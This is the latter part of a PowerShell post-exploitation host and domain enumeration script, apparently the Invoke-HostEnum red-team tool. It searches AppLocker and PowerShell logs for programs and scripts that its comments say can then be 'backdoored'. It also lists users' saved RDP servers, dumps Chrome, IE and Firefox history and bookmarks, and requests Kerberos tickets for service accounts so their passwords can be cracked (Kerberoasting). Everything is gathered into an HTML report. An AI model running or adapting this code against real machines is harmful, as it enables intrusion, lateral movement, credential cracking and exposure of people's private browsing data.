	                $ReturnInfo.Add($Key, $ResultObj)
	            }
	            else
	            {
	                $ReturnInfo[$Key].Count++
	                #$ReturnInfo[$Key].Times += ,$Logon.TimeGenerated
	            }
	        }
	    }

	    return $ReturnInfo
	}


	function Find-AppLockerLogs
	{
	<#
	.SYNOPSIS

	Look through the AppLocker logs to find processes that get run on the server. You can then backdoor these exe's (or figure out what they normally run).

	Function: Find-AppLockerLogs
	Author: Joe Bialek, Twitter: @JosephBialek
	Required Dependencies: None
	Optional Dependencies: None

	.DESCRIPTION

	Look through the AppLocker logs to find processes that get run on the server. You can then backdoor these exe's (or figure out what they normally run).

	.EXAMPLE

	Find-AppLockerLogs
	Find process creations from AppLocker logs.

	.NOTES

	.LINK

	Blog: http://clymb3r.wordpress.com/
	Github repo: https://github.com/clymb3r/PowerShell
	#>
	    $ReturnInfo = @{}

	    $AppLockerLogs = Get-WinEvent -LogName "Microsoft-Windows-AppLocker/EXE and DLL" -ErrorAction SilentlyContinue | Where {$_.Id -eq 8002}

	    foreach ($Log in $AppLockerLogs)
	    {
	        $SID = New-Object System.Security.Principal.SecurityIdentifier($Log.Properties[7].Value)
	        $UserName = $SID.Translate( [System.Security.Principal.NTAccount])

	        $ExeName = $Log.Properties[10].Value

	        $Key = $UserName.ToString() + "::::" + $ExeName

	        if (!$ReturnInfo.ContainsKey($Key))
	        {
	            $Properties = @{
	                Exe = $ExeName
	                User = $UserName.Value
	                Count = 1
	                Times = @($Log.TimeCreated)
	            }

	            $Item = New-Object PSObject -Property $Properties
	            $ReturnInfo.Add($Key, $Item)
	        }
	        else
	        {
	            $ReturnInfo[$Key].Count++
	            $ReturnInfo[$Key].Times += ,$Log.TimeCreated
	        }
	    }

	    return $ReturnInfo
	}


	Function Find-PSScriptsInPSAppLog
	{
	<#
	.SYNOPSIS

	Go through the PowerShell operational log to find scripts that run (by looking for ExecutionPipeline logs eventID 4100 in PowerShell app log).
	You can then backdoor these scripts or do other malicious things.

	Function: Find-AppLockerLogs
	Author: Joe Bialek, Twitter: @JosephBialek
	Required Dependencies: None
	Optional Dependencies: None

	.DESCRIPTION

	Go through the PowerShell operational log to find scripts that run (by looking for ExecutionPipeline logs eventID 4100 in PowerShell app log).
	You can then backdoor these scripts or do other malicious things.

	.EXAMPLE

	Find-PSScriptsInPSAppLog
	Find unique PowerShell scripts being executed from the PowerShell operational log.

	.NOTES

	.LINK

	Blog: http://clymb3r.wordpress.com/
	Github repo: https://github.com/clymb3r/PowerShell
	#>
	    $ReturnInfo = @{}
	    $Logs = Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -ErrorAction SilentlyContinue | Where {$_.Id -eq 4100}

	    foreach ($Log in $Logs)
	    {
	        $ContainsScriptName = $false
	        $LogDetails = $Log.Message -split "`r`n"

	        $FoundScriptName = $false
	        foreach($Line in $LogDetails)
	        {
	            if ($Line -imatch "^\s*Script\sName\s=\s(.+)")
	            {
	                $ScriptName = $Matches[1]
	                $FoundScriptName = $true
	            }
	            elseif ($Line -imatch "^\s*User\s=\s(.*)")
	            {
	                $User = $Matches[1]
	            }
	        }

	        if ($FoundScriptName)
	        {
	            $Key = $ScriptName + "::::" + $User

	            if (!$ReturnInfo.ContainsKey($Key))
	            {
	                $Properties = @{
	                    ScriptName = $ScriptName
	                    UserName = $User
	                    Count = 1
	                    Times = @($Log.TimeCreated)
	                }

	                $Item = New-Object PSObject -Property $Properties
	                $ReturnInfo.Add($Key, $Item)
	            }
	            else
	            {
	                $ReturnInfo[$Key].Count++
	                $ReturnInfo[$Key].Times += ,$Log.TimeCreated
	            }
	        }
	    }

	    return $ReturnInfo
	}


	Function Find-RDPClientConnections
	{
	<#
	.SYNOPSIS

	Search the registry to find saved RDP client connections. This shows you what connections an RDP client has remembered, indicating what servers the user 
	usually RDP's to.

	Function: Find-RDPClientConnections
	Author: Joe Bialek, Twitter: @JosephBialek
	Required Dependencies: None
	Optional Dependencies: None

	.DESCRIPTION

	Search the registry to find saved RDP client connections. This shows you what connections an RDP client has remembered, indicating what servers the user 
	usually RDP's to.

	.EXAMPLE

	Find-RDPClientConnections
	Find unique saved RDP client connections.

	.NOTES

	.LINK

	Blog: http://clymb3r.wordpress.com/
	Github repo: https://github.com/clymb3r/PowerShell
	#>
	    $ReturnInfo = @{}

	    $Null = New-PSDrive -Name HKU -PSProvider Registry -Root Registry::HKEY_USERS -ErrorAction SilentlyContinue

	    #Attempt to enumerate the servers for all users
	    $Users = Get-ChildItem -Path "HKU:\"
	    foreach ($UserSid in $Users.PSChildName)
	    {
	        $Servers = Get-ChildItem "HKU:\$($UserSid)\Software\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue

	        foreach ($Server in $Servers)
	        {
	            $Server = $Server.PSChildName
	            $UsernameHint = (Get-ItemProperty -Path "HKU:\$($UserSid)\Software\Microsoft\Terminal Server Client\Servers\$($Server)").UsernameHint
	                
	            $Key = $UserSid + "::::" + $Server + "::::" + $UsernameHint

	            if (!$ReturnInfo.ContainsKey($Key))
	            {
	                $SIDObj = New-Object System.Security.Principal.SecurityIdentifier($UserSid)
	                $User = ($SIDObj.Translate([System.Security.Principal.NTAccount])).Value

	                $Properties = @{
	                    CurrentUser = $User
	                    Server = $Server
	                    UsernameHint = $UsernameHint
	                }

	                $Item = New-Object PSObject -Property $Properties
	                $ReturnInfo.Add($Key, $Item)
	            }
	        }
	    }

	    return $ReturnInfo
	}

	# End PowerSploit Functions

	Function Get-BrowserInformation {
	<#
	    .SYNOPSIS

	        Dumps Browser Information
	        Author: @424f424f
	        License: BSD 3-Clause
	        Required Dependencies: None
	        Optional Dependencies: None
	        https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1

	    .DESCRIPTION

	        Enumerates browser history or bookmarks for a Chrome, Internet Explorer,
	        and/or Firefox browsers on Windows machines.

	    .PARAMETER Browser

	        The type of browser to enumerate, 'Chrome', 'IE', 'Firefox' or 'All'

	    .PARAMETER Datatype

	        Type of data to enumerate, 'History' or 'Bookmarks'

	    .PARAMETER UserName

	        Specific username to search browser information for.

	    .PARAMETER Search

	        Term to search for

	    .EXAMPLE

	        PS C:\> Get-BrowserInformation

	        Enumerates browser information for all supported browsers for all current users.

	    .EXAMPLE

	        PS C:\> Get-BrowserInformation -Browser IE -Datatype Bookmarks -UserName user1

	        Enumerates bookmarks for Internet Explorer for the user 'user1'.

	    .EXAMPLE

	        PS C:\> Get-BrowserInformation -Browser All -Datatype History -UserName user1 -Search 'github'

	        Enumerates bookmarks for Internet Explorer for the user 'user1' and only returns
	        results matching the search term 'github'.
	#>
	    [CmdletBinding()]
	    Param
	    (
	        [Parameter(Position = 0)]
	        [String[]]
	        [ValidateSet('Chrome','IE','FireFox', 'All')]
	        $Browser = 'All',

	        [Parameter(Position = 1)]
	        [String[]]
	        [ValidateSet('History','Bookmarks','All')]
	        $DataType = 'All',

	        [Parameter(Position = 2)]
	        [String]
	        $UserName = '',

	        [Parameter(Position = 3)]
	        [String]
	        $Search = ''
	    )

	    Write-Verbose "Enumerating Web browser history..."
	    Write-Output "`n`n[+] Browser History"

	    function ConvertFrom-Json20([object] $item){
	        #http://stackoverflow.com/a/29689642
	        Add-Type -AssemblyName System.Web.Extensions
	        $ps_js = New-Object System.Web.Script.Serialization.JavaScriptSerializer
	        return ,$ps_js.DeserializeObject($item)
	        
	    }

	    function Get-ChromeHistory {
	        $Path = "$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\History"
	        if (-not (Test-Path -Path $Path)) {
	            Write-Output "[-] Could not find Chrome History for username: $UserName"
	        }
	        $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
	        $Value = Get-Content -Path "$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\History"|Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
	        $Value | ForEach-Object {
	            $Key = $_
	            if ($Key -match $Search){
	                New-Object -TypeName PSObject -Property @{
	                    User = $UserName
	                    Browser = 'Chrome'
	                    DataType = 'History'
	                    Data = $_
	                }
	            }
	        }        
	    }

	    function Get-ChromeBookmarks {
	    $Path = "$Env:systemdrive\Users\$UserName\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
	    if (-not (Test-Path -Path $Path)) {
	        Write-Output "[-] Could not find FireFox Bookmarks for username: $UserName"
	    }   else {
	            $Json = Get-Content $Path
	            $Output = ConvertFrom-Json20($Json)
	            $Jsonobject = $Output.roots.bookmark_bar.children
	            $Jsonobject.url |Sort -Unique | ForEach-Object {
	                if ($_ -match $Search) {
	                    New-Object -TypeName PSObject -Property @{
	                        User = $UserName
	                        Browser = 'Firefox'
	                        DataType = 'Bookmark'
	                        Data = $_
	                    }
	                }
	            }
	        }
	    }

	    function Get-InternetExplorerHistory {
	        #https://crucialsecurityblog.harris.com/2011/03/14/typedurls-part-1/

	        $Null = New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS -ErrorAction SilentlyContinue
	        $Paths = Get-ChildItem 'HKU:\' -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

	        ForEach($Path in $Paths) {

	            $User = ([System.Security.Principal.SecurityIdentifier] $Path.PSChildName).Translate( [System.Security.Principal.NTAccount]) | Select -ExpandProperty Value

	            $Path = $Path | Select-Object -ExpandProperty PSPath

	            $UserPath = "$Path\Software\Microsoft\Internet Explorer\TypedURLs"
	            if (-not (Test-Path -Path $UserPath)) {
	                Write-Output "[-] Could not find IE History for SID: $Path"
	            }
	            else {
	                Get-Item -Path $UserPath -ErrorAction SilentlyContinue | ForEach-Object {
	                    $Key = $_
	                    $Key.GetValueNames() | ForEach-Object {
	                        $Value = $Key.GetValue($_)
	                        if ($Value -match $Search) {
	                            New-Object -TypeName PSObject -Property @{
	                                User = $UserName
	                                Browser = 'IE'
	                                DataType = 'History'
	                                Data = $Value
	                            }
	                        }
	                    }
	                }
	            }
	        }
	    }

	    function Get-InternetExplorerBookmarks {
	        $URLs = Get-ChildItem -Path "$Env:systemdrive\Users\" -Filter "*.url" -Recurse -ErrorAction SilentlyContinue
	        ForEach ($URL in $URLs) {
	            if ($URL.FullName -match 'Favorites') {
	                $User = $URL.FullName.split('\')[2]
	                Get-Content -Path $URL.FullName | ForEach-Object {
	                    try {
	                        if ($_.StartsWith('URL')) {
	                            # parse the .url body to extract the actual bookmark location
	                            $URL = $_.Substring($_.IndexOf('=') + 1)

	                            if($URL -match $Search) {
	                                New-Object -TypeName PSObject -Property @{
	                                    User = $User
	                                    Browser = 'IE'
	                                    DataType = 'Bookmark'
	                                    Data = $URL
	                                }
	                            }
	                        }
	                    }
	                    catch {
	                        Write-Verbose "Error parsing url: $_"
	                    }
	                }
	            }
	        }
	    }

	    function Get-FireFoxHistory {
	        $Path = "$Env:systemdrive\Users\$UserName\AppData\Roaming\Mozilla\Firefox\Profiles\"
	        if (-not (Test-Path -Path $Path)) {
	            Write-Verbose "[!] Could not find FireFox History for username: $UserName"
	        }
	        else {
	            $Profiles = Get-ChildItem -Path "$Path\*.default\" -ErrorAction SilentlyContinue
	            $Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
	            $Value = Get-Content $Profiles\places.sqlite | Select-String -Pattern $Regex -AllMatches |Select-Object -ExpandProperty Matches |Sort -Unique
	            $Value.Value |ForEach-Object {
	                if ($_ -match $Search) {
	                    ForEach-Object {
	                    New-Object -TypeName PSObject -Property @{
	                        User = $UserName
	                        Browser = 'Firefox'
	                        DataType = 'History'
	                        Data = $_
	                        }    
	                    }
	                }
	            }
	        }
	    }

	    if (!$UserName) {
	        $UserName = "$ENV:USERNAME"
	    }

	    if(($Browser -Contains 'All') -or ($Browser -Contains 'Chrome')) {
	        if (($DataType -Contains 'All') -or ($DataType -Contains 'History')) {
	            Get-ChromeHistory
	        }
	        if (($DataType -Contains 'All') -or ($DataType -Contains 'Bookmarks')) {
	            Get-ChromeBookmarks
	        }
	    }

	    if(($Browser -Contains 'All') -or ($Browser -Contains 'IE')) {
	        if (($DataType -Contains 'All') -or ($DataType -Contains 'History')) {
	            Get-InternetExplorerHistory
	        }
	        if (($DataType -Contains 'All') -or ($DataType -Contains 'Bookmarks')) {
	            Get-InternetExplorerBookmarks
	        }
	    }

	    if(($Browser -Contains 'All') -or ($Browser -Contains 'FireFox')) {
	        if (($DataType -Contains 'All') -or ($DataType -Contains 'History')) {
	            Get-FireFoxHistory
	        }
	    }
	}

	Function Get-ActiveIEURLS {
	<#
	.SYNOPSIS

	Returns a list of URLs currently loaded in the browser
	Source: http://windowsitpro.com/powershell/retrieve-information-open-browsing-sessions
	#>
		Param([switch]$Full, [switch]$Location, [switch]$Content)
		$urls = (New-Object -ComObject Shell.Application).Windows() |
		Where-Object {$_.LocationUrl -match "(^https?://.+)|(^ftp://)"} |
		Where-Object {$_.LocationUrl}
		Write-Output "`n[+] Active Internet Explorer Tabs`n"
		if ($urls) {
			if($Full)
			{
			    $urls
			}
			elseif($Location)
			{
			    $urls | select Location*
			}
			elseif($Content)
			{
			    $urls | ForEach-Object {
			        $ie.LocationName;
			        $ie.LocationUrl;
			        $_.Document.body.innerText
			    }
			}
			else
			{
			    $urls | ForEach-Object {$_.LocationUrl}
			}
		}
		else {
			Write-Output "[-] No active Internet Explorer windows found"
		}
	}


	# End Browser Enumeration

	Function Get-UserSPNS {
	<#
	  .SYNOPSIS

	  # Edits by Tim Medin
	  # File:     GetUserSPNS.ps1
	  # Contents: Query the domain to find SPNs that use User accounts
	  # Comments: This is for use with Kerberoast https://github.com/nidem/kerberoast
	  #           The password hash used with Computer accounts are infeasible to 
	  #           crack; however, if the User account associated with an SPN may have
	  #           a crackable password. This tool will find those accounts. You do not
	  #           need any special local or domain permissions to run this script. 
	  #           This script on a script supplied by Microsoft (details below).
	  # History:  2016/07/07     Tim Medin    Add -UniqueAccounts parameter to only get unique SAMAccountNames
	  #           2016/04/12     Tim Medin    Added -Request option to automatically get the tickets
	  #           2014/11/12     Tim Medin    Created
	#>
	  [CmdletBinding()]
	  Param(
	    [Parameter(Mandatory=$False,Position=1)] [string]$GCName,
	    [Parameter(Mandatory=$False)] [string]$Filter,
	    [Parameter(Mandatory=$False)] [switch]$Request,
	    [Parameter(Mandatory=$False)] [switch]$UniqueAccounts
	  )
	  Write-Verbose "Enumerating user SPNs for potential Kerberoast cracking..."
	  Write-Output "`n[+] USER SPNS"
	  Add-Type -AssemblyName System.IdentityModel

	  $GCs = @()

	  If ($GCName) {
	    $GCs += $GCName
	  } else { # find them
	    $ForestInfo = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
	    $CurrentGCs = $ForestInfo.FindAllGlobalCatalogs()
	    ForEach ($GC in $CurrentGCs) {
	      #$GCs += $GC.Name
	      $GCs += $ForestInfo.ApplicationPartitions[0].SecurityReferenceDomain
	    }
	  }

	  if (-not $GCs) {
	    # no Global Catalogs Found
	    Write-Output "`n[-] No Global Catalogs Found!"
	    Return
	  }

	  ForEach ($GC in $GCs) {
	      $searcher = New-Object System.DirectoryServices.DirectorySearcher
	      $searcher.SearchRoot = "LDAP://" + $GC
	      $searcher.PageSize = 1000
	      $searcher.Filter = "(&(!objectClass=computer)(servicePrincipalName=*))"
	      $Null = $searcher.PropertiesToLoad.Add("serviceprincipalname")
	      $Null = $searcher.PropertiesToLoad.Add("name")
	      $Null = $searcher.PropertiesToLoad.Add("samaccountname")
	      #$Null = $searcher.PropertiesToLoad.Add("userprincipalname")
	      #$Null = $searcher.PropertiesToLoad.Add("displayname")
	      $Null = $searcher.PropertiesToLoad.Add("memberof")
	      $Null = $searcher.PropertiesToLoad.Add("pwdlastset")
	      #$Null = $searcher.PropertiesToLoad.Add("distinguishedname")

	      $searcher.SearchScope = "Subtree"

	      $results = $searcher.FindAll()
	      
	      [System.Collections.ArrayList]$accounts = @()
	          
	      foreach ($result in $results) {
	          foreach ($spn in $result.Properties["serviceprincipalname"]) {
	              $o = Select-Object -InputObject $result -Property `
	                  @{Name="ServicePrincipalName"; Expression={$spn.ToString()} }, `
	                  @{Name="Name";                 Expression={$result.Properties["name"][0].ToString()} }, `
	                  #@{Name="UserPrincipalName";   Expression={$result.Properties["userprincipalname"][0].ToString()} }, `
	                  @{Name="SAMAccountName";       Expression={$result.Properties["samaccountname"][0].ToString()} }, `
	                  #@{Name="DisplayName";         Expression={$result.Properties["displayname"][0].ToString()} }, `
	                  @{Name="MemberOf";             Expression={$result.Properties["memberof"][0].ToString()} }, `
	                  @{Name="PasswordLastSet";      Expression={[datetime]::fromFileTime($result.Properties["pwdlastset"][0])} } #, `
	                  #@{Name="DistinguishedName";   Expression={$result.Properties["distinguishedname"][0].ToString()} }
	              if ($UniqueAccounts) {
	                  if (-not $accounts.Contains($result.Properties["samaccountname"][0].ToString())) {
	                      $Null = $accounts.Add($result.Properties["samaccountname"][0].ToString())
	                      $o
	                      if ($Request) {
	                          $Null = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn.ToString()
	                      }
	                  }
	              } else {
	                  $o
	                  if ($Request) {
	                      $Null = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn.ToString()
	                  }
	              }
	          }
	      }
	  }
	}

	Function Format-HTMLTable {
		<#
		.SYNOPSIS
		
		Formats function output as an HTML table
		If the -Object switch is present, uses Powershell Object native HTML table conversion (ConvertTo-HTML)
		
		#>
		Param(
			[Parameter(Mandatory=$True,Position=0)] 
			[String] $Title,
			
			[Parameter(Mandatory=$True,Position=1)] 
			$Contents,
			
			[Parameter(Mandatory=$False)]
			[switch]$Object
			)
			
		# Add Function name to Table of Contents
		$script:TOC += '<a href="#'+ $Title + '">' + $Title + '</a>|'
		
		# Add Header to table
		$TableHeader = '<br><font size="+2"><b><u><a name="' + $Title + '">' + $Title + '</a></b></u></font><a href="#TOP"> [Top] </a>'
		
		# Create HTML Table
		If ($Object) {
			$Table = $Contents | ConvertTo-HTML -fragment
		}
		# If $Contents is a string, then manually build the HTML table with <pre> tags
		Else {
			$Table = '<table style="width:100%"><tr><td><pre>' + $Contents + '</pre></td></tr></table>'
		}
		Return $TableHeader,$Table
	}

	# Create HTML Table of Contents
	$script:TOC = '<a name="TOP"></a>'

	# HTML Header for table style
	$HTMLHeader = @"
<style>
TABLE {border-width: 1px;border-style: solid;border-color: black;border-collapse: collapse;}
TH {border-width: 1px;padding: 3px;border-style: solid;border-color: black;background-color: #6495ED;}
TD {border-width: 1px;padding: 3px;border-style: solid;border-color: black;font-family:courier;}
TR:Nth-Child(Even) {Background-Color: #dddddd;}
.odd  { background-color:#ffffff; }
.even { background-color:#dddddd; }
</style>
<title>
Invoke-HostEnum
</title>
"@
	

### Begin Main Execution
	
	$Time = (Get-Date).ToUniversalTime()
	[string]$StartTime = $Time|Get-Date -uformat  %Y%m%d_%H%M%S
	
	# Create filename for enumeration output if specified
	If ($Path) {
		[string]$Hostname = [System.Net.Dns]::GetHostName()
		[string]$FileName = $StartTime + '_' + $Hostname + '.html'
		# Expand "." to full working directory
		If ($Path -eq '.') {$Path = $PWD.path}
		[String] $FilePath = (Join-Path $Path $FileName)
		# Test file write permissions before continuing
		# It really sucks to find out you can't write your enumeration file after executing for 10 minutes
		Try {Set-Content $FilePath -Value $Null -ErrorAction "stop"}
		Catch {Write-Output "`n[-] Error writing enumeration output to disk! Check your permissions on $Path.`n$($Error[0])`n"; Return}
	}

	# Write initial execution status to screen
	Write-Output "[+] Invoke-HostEnum"
	Write-Output "[+] STARTTIME:`t$StartTime"
	Write-Output "[+] PID:`t$PID`n"

	# Check user context of Powershell.exe process and alert if running as SYSTEM
	$IsSystem = [Security.Principal.WindowsIdentity]::GetCurrent().IsSystem
	If ($IsSystem) {Write-Verbose "`n[*] Alert: Enumeration is running as SYSTEM and some enumeration techniques (Domain and User-context specific) may fail to yield desired results!`n"}
	
	# Initialize variable to store string output of enumeration functions
	[string]$Results = $null
	
	# If $Local switch is set, execute local system enumeration functions
	# Need to seperate out privileged vs non-privileged commands
	If ($Local) {
		# Execute local enumeration functions and format for report
		If ($Path) {
			$Results += Format-HTMLTable "Host Summary" (Get-Sysinfo)
			$Results += Format-HTMLTable "Detailed Host Configuration" (Get-LocalCommands)
			$Results += Format-HTMLTable "Process Listing" (Get-ProcessInfo)
			$Results += Format-HTMLTable "Interesting Files" (Get-InterestingFiles)
			$Results += Format-HTMLTable "Recycle Bin Contents" (Get-RecycleBin)
			$Results += Format-HTMLTable "Installed AV Products" (Get-AVInfo)
			$Results += Format-HTMLTable "Interesting Windows Logs" (Get-ComputerDetails -ToString)
			$Results += Format-HTMLTable "Browser History" (Get-BrowserInformation |Format-Table User,Browser,Datatype,Data -auto| Out-String -width 300)
			$Results += Format-HTMLTable "Active Tabs in IE" (Get-ActiveIEURLS -location |Format-Table -auto |Out-String -width 300) 
		}
		# Don't format as HTML and output to console
		Else {
			Get-SysInfo
			Get-LocalCommands
			Get-ProcessInfo
			Get-InterestingFiles
			Get-RecycleBin
			Get-AVInfo
			Get-ComputerDetails -ToString
			Get-BrowserInformation |Format-Table User,Browser,Datatype,Data -auto| Out-String -width 300
			Get-ActiveIEURLS -location |Format-Table -auto |Out-String -width 300
		}
	}
		
	# If $Domain switch is set, check if host is part of a domain before executing domain enumeration Functions
	If ($Domain) {
		If ((gwmi win32_computersystem).partofdomain){
			If ($Path) {
					$Results += Format-HTMLTable "Domain Information" (Get-DomainInfo)
					$Results += Format-HTMLTable "User SPNs" (Get-UserSPNS -UniqueAccounts| Format-Table -auto |Out-String -width 400)
				}
			Else {
				Get-DomainInfo
				Get-UserSPNS -UniqueAccounts| Format-Table -auto |Out-String -width 400
			}
		}
		Else {
			Write-Output "`n[-] Host is not a member of a domain. Skipping domain checks...`n"
		}
	}

	# Write out the enumeration file
	If ($Path) {
		$Results = "<center><h1>System Report</h1></center>" + $script:TOC + $Results

		# Attempt to write $Results to file
		Try {
			ConvertTo-HTML -Head $HTMLHeader -Body $Results | Add-Content $FilePath
			Write-Output "[+] OUTPUT:`t$FilePath`t$((Get-Item $FilePath).length) Bytes"
					}
		Catch {
			Write-Output "`n[-] Error writing enumeration output to file! Check your permissions at $Path. $($Error[0])`n"
		}
	}

	# Determine the execution duration
	$Duration = New-Timespan -start $Time -end ((Get-Date).ToUniversalTime())
	Write-Output "[+] DURATION:`t$Duration`n[+] Execution complete!`n"
}